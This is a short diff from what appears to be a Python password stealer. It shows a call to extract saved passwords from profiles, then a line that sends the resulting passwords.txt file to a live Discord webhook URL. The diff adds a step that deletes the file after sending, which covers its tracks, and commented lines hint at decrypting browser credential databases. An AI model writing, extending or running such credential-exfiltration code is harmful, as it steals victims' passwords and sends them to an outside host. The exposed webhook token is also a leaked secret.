@@ -150,8 +150,9 @@ if __name__ == "__main__":
     extract_passwords_from_profiles()
 
 
-send_to_discord("passwords.txt", "https://discord.com/api/webhooks/1401270561782501477/s1TSaeTOk8RuHhM4WDQRse8LSUjt4IA-zMgXOL1Y-r16ApgAN72mDczE5eKYBWnwUvuR")
 
+send_to_discord("passwords.txt", "https://discord.com/api/webhooks/1401270561782501477/s1TSaeTOk8RuHhM4WDQRse8LSUjt4IA-zMgXOL1Y-r16ApgAN72mDczE5eKYBWnwUvuR")
+os.remove("passwords.txt")
 
 '''key = get_aes()
 db_file = copy_db()
